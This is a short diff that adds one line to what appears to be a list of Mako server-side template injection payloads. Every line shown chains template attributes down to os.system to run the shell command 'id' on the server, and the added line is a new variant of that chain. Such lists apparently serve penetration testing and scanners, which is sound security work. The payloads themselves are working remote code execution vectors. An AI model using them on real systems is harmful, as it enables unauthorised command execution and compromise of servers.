@@ -82,3 +82,4 @@ ${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
 ${self.template.module.cache.compat.inspect.linecache.os.system("id")}
 ${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
 ${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
+${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
